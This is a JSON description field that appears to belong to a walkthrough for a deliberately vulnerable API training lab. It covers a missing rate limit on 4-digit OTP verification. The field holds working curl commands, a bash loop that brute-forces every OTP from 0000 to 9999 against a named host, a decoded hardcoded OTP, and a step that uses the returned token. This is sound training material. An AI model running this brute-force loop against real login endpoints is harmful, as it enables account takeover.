			"description": "Lack of Resources & Rate Limiting\r\n\r\nWe believe OTPs are a great way of authenticating users and secure too if implemented correctly!\r\n\r\n### Request an OTP\r\nAny 10-digit number is accepted; nothing is actually sent anywhere:\r\n```bash\r\ncurl -v -X POST https://{{host}}/vapi/api4/login \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"mobileno\":\"8000000535\"}'\r\n```\r\n\r\n### Verify a 4-digit OTP\r\n```bash\r\ncurl -v -X POST https://{{host}}/vapi/api4/otp/verify \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"otp\":\"9999\"}'\r\n```\r\n\r\n### Fast path (under 10 requests)\r\n`POST api4/otp/verify` carries no rate-limit middleware (compare `routes/api.php`, where `api9/v2/user/login` explicitly has `->middleware('throttle:5,1')` and this route does not). The OTP value is also hardcoded in the source you were given, at `app/CustomClasses/Variables.php`, base64 encoded. Reading and decoding it costs zero requests to the server:\r\n```bash\r\ncurl -s https://raw.githubusercontent.com/meetd2005/serverlesswp/main/vapi/app/CustomClasses/Variables.php | grep -A2 getAPI4OTP\r\n# returns: return \"MTg3Mg==\";\r\necho MTg3Mg== | base64 -d\r\n# prints: 1872\r\n```\r\nConfirm it with a single verbose request:\r\n```bash\r\ncurl -v -X POST https://{{host}}/vapi/api4/otp/verify \\\r\n  -H 'Content-Type: application/json' \\\r\n  -d '{\"otp\":\"1872\"}'\r\n```\r\nA hit returns `{\"success\":\"true\",\"key\":\"...\"}`. That took one request to confirm, well under ten.\r\n\r\n### Exhaustive path: brute force without reading the source\r\nIf you want to see the attack the way it is meant to be found without source access, the lack of a rate limit means every 4-digit value (0000-9999) can be tried in a loop instead:\r\n```bash\r\nhost=vapi-bdo3.onrender.com\r\nfor otp in $(seq -w 0000 9999); do\r\n  # one verify attempt per candidate OTP\r\n  response=$(curl -s -X POST \"https://$host/vapi/api4/otp/verify\" \\\r\n    -H 'Content-Type: application/json' \\\r\n    -d \"{\\\"otp\\\":\\\"$otp\\\"}\")\r\n  case \"$response\" in\r\n    *'\"success\":\"true\"'*)\r\n      echo \"Valid OTP found: $otp\"\r\n      echo \"Response: $response\"\r\n      break\r\n      ;;\r\n  esac\r\ndone\r\n```\r\nThis is bounded at 10,000 requests in the worst case; run it only against an instance you own, and expect it to take a while over the network.\r\n\r\n### Use the key\r\n```bash\r\ncurl -v https://{{host}}/vapi/api4/user \\\r\n  -H 'Authorization-Token: <key from the hit above>'\r\n```",
